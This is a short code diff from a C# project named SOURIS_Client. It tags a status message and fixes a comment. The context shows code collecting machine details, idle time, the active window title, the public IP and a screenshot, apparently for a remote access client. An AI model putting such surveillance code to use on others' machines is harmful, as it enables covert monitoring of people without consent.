@@ -112,7 +112,7 @@ namespace SOURIS_Client
             string ramuse = RamUsage();
             string lastinput = GetLastInputTime();
             string activewindow = GetActiveWindowTitle();
-            string message = $"{machinename}|{country}|{ping}ms|{cpuuse}|{ramuse}|{lastinput}|{activewindow}|{GetIPAdress()}";
+            string message = $"{machinename}|{country}|{ping}ms|{cpuuse}|{ramuse}|{lastinput}|{activewindow}|{GetIPAdress()}|THISISALLINFOFUNC";
             return message;
         }
         //<---------------------------------Get Last input----------------------------->
@@ -128,7 +128,7 @@ namespace SOURIS_Client
             savename = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Screenshot.png");
             resolution.Save(savename);
         }
-        //<---------------------------------Get Last input----------------------------->
+        //<---------------------------------Get IP----------------------------->
         public static string GetIPAdress()
         {
             string jsoon = new WebClient().DownloadString("http://icanhazip.com");
